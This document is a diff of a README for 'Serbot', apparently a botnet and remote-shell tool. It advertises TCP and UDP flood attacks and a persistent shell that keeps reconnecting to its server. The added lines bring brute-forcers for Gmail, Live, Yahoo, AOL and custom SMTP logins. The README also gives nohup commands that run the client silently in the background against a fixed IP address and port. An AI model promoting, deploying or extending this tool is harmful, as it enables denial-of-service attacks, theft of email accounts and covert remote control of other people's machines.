@@ -31,7 +31,12 @@ In Serbot, everything was dealt with, your Server will never crash nor will your
 1. Linux/Windows Version.
 1. TCP Flood.
 1. UDP Flood.
-1. You’ll never lose your shell. (Commands with No Output, Wrong Commands and Interactive Programs won’t kill your shell)
+1. Gmail Bruteforcer (Workaround gmail's SMTP login)
+1. Live Bruteforcer
+1. Yahoo Bruteforcer
+1. AOL Bruteforce
+1. Custome SMTP Bruteforcer
+1. You’ll never lose your shell. (No Output, Wrong, Interactive and Infinite commands won’t kill your shell)
 1. Never closes and is always trying to connect to the Server.
 1. Can handle any command properly, such as the cd command.
 1. Always gets back a response. (Command Output or Simple Client response)
@@ -59,5 +64,5 @@ nohup python client.py 15.48.158.15 1567 > /dev/null &
 nohup python client.py 15.48.158.15 1567 > /dev/null 2>&1 &
 
 Greetings to Team Prophetic, Chaoshackerz and all the followers of https://dotcppfile.wordpress.com/,
-That’s all for today,
+That’s all,
 dotcppfile.
